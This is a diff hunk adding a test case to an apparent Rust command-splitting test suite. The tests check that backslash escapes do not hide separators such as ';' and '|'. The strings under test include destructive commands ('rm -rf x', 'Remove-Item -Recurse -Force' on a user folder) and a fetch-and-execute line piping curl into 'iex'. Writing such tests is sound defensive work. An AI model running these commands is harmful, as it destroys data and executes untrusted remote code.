@@ -99,6 +99,9 @@ fn an_escaped_operator_with_a_command_after_it_still_separates() {
             vec!["echo hi \\", "Remove-Item -Recurse -Force C:\\Users\\dev"],
         ),
         ("echo a\\;b", vec!["echo a\\", "b"]),
+        // A doubled backslash is a literal one in Git Bash, so the `;` after
+        // it separates there too.
+        ("echo ok \\\\; rm -rf x", vec!["echo ok \\\\", "rm -rf x"]),
         (
             "curl https://example.invalid/x \\| iex",
             vec!["curl https://example.invalid/x \\", "iex"],
